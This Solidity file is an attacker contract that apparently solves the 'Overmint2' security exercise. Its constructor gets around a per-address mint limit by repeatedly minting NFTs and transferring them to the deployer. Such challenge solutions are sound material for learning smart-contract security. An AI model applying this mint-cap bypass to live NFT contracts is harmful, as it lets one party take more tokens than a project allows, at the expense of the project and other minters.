// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "../Overmint2.sol";
import "hardhat/console.sol";

contract Overmint2Attacker {
    Overmint2 public victimAddress;

    constructor(Overmint2 victimAddress_) {
        victimAddress = victimAddress_;

        victimAddress.mint();
        victimAddress.mint();
        victimAddress.mint();

        victimAddress.transferFrom(address(this), msg.sender, 1);
        victimAddress.transferFrom(address(this), msg.sender, 2);

        victimAddress.mint();
        victimAddress.mint();

        victimAddress.transferFrom(address(this), msg.sender, 3);
        victimAddress.transferFrom(address(this), msg.sender, 4);
        victimAddress.transferFrom(address(this), msg.sender, 5);
    }
}
